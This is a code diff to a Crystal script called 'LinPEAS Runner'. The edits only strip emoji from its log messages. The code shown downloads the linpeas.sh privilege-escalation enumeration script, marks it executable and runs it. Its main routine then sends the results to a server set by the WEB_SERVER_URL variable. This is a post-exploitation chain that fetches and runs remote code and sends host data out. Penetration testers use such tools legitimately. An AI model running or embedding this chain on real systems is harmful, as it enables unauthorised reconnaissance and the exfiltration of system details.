@@ -13,18 +13,18 @@ def download_from_url(url : String)
   HTTP::Client.get(url) do |response|
     File.write(LINPEAS_PATH, response.body)
     File.chmod(LINPEAS_PATH, 0o755)
-    puts "✅ linpeas.sh downloaded successfully"
+    puts "linpeas.sh downloaded successfully"
   end
   true
 rescue ex
-  puts "❌ Error downloading from URL: #{ex.message}"
+  puts "Error downloading from URL: #{ex.message}"
   false
 end
 
 # Download linpeas and return true if successfull
 # Download linpeas and return true if successful
 def download_linpeas(url = LINPEAS_URL) : Bool
-  puts "📥 Downloading linpeas from #{url}..."
+  puts "Downloading linpeas from #{url}..."
   
   begin
     # Blockless GET: Fetches the response headers immediately
@@ -37,7 +37,7 @@ def download_linpeas(url = LINPEAS_URL) : Bool
         # Recursively follow the redirect
         return download_linpeas(location)
       else
-        puts "❌ Redirected, but no Location header found."
+        puts "Redirected, but no Location header found."
         return false
       end
       
@@ -45,16 +45,16 @@ def download_linpeas(url = LINPEAS_URL) : Bool
       # Write the actual payload to the file
       File.write(LINPEAS_PATH, response.body)
       File.chmod(LINPEAS_PATH, 0o755)
-      puts "✅ linpeas.sh downloaded successfully"
+      puts "linpeas.sh downloaded successfully"
       return true
       
     else
-      puts "❌ Failed with status code: #{response.status_code}"
+      puts "Failed with status code: #{response.status_code}"
       return false
     end
 
   rescue ex
-    puts "❌ Error downloading linpeas.sh: #{ex.message}"
+    puts "Error downloading linpeas.sh: #{ex.message}"
     return false
   end
 end
@@ -121,35 +121,35 @@ end
 
 
 def main
-  puts "🚀 LinPEAS Runner - Crystal Edition"
+  puts "LinPEAS Runner - Crystal Edition"
   puts "=" * 50
   
   unless WEB_SERVER_URL
-    puts "⚠️  WEB_SERVER_URL environment variable not set"
+    puts "WEB_SERVER_URL environment variable not set"
     puts "Usage: WEB_SERVER_URL=http://your-server.com/upload crystal linpeas_runner.cr"
     return
   end
   
   # Step 1: Download linpeas
   unless download_linpeas
-    puts "❌ Failed to download linpeas.sh"
+    puts "Failed to download linpeas.sh"
     return
   end
   
   # Step 2: Run linpeas
   unless run_linpeas
-    puts "❌ Failed to run linpeas.sh"
+    puts "Failed to run linpeas.sh"
     return
   end
   
   # Step 3: Send results to server
   unless send_to_server
-    puts "❌ Failed to send results to server"
+    puts "Failed to send results to server"
     return
   end
   
   puts "=" * 50
-  puts "✨ All tasks completed successfully!"
+  puts "All tasks completed successfully!"
 end
  
 main
